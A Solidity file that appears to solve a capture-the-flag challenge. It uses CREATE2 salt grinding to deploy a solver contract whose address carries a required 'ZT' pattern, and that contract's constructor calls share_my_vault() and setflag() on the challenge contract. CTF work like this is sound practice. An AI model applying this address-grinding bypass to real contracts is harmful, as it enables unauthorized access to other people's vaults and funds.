pragma solidity ^0.8.12;

interface IExisting {
    function share_my_vault() external;

    function setflag() external;
}

contract ExistingSolver {
    constructor(address existing_) public {
        IExisting exist = IExisting(existing_);
        exist.share_my_vault();
        exist.setflag();
    }
}

contract ExistingSolverDeployer {
    function calcSolverAddress(
        uint256 salt,
        address existing
    ) public view returns (address) {
        address result = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(this),
                            bytes32(salt),
                            keccak256(
                                abi.encodePacked(
                                    type(ExistingSolver).creationCode,
                                    abi.encode(existing)
                                )
                            )
                        )
                    )
                )
            )
        );
        return result;
    }

    function solve(uint256 salt_, address challenge_) external {
        new ExistingSolver{salt: bytes32(salt_)}(challenge_);
    }

    function isSolverAddressValid(
        address solverAddress
    ) external pure returns (bool) {
        bytes20 code = bytes20(uint160(0xffff));
        bytes20 feature = bytes20(bytes32("ZT")) >> 144;
        for (uint256 i = 0; i < 34; i++) {
            if (bytes20(solverAddress) & code == feature) {
                return true;
            }
            code <<= 4;
            feature <<= 4;
        }
        return false;
    }
}
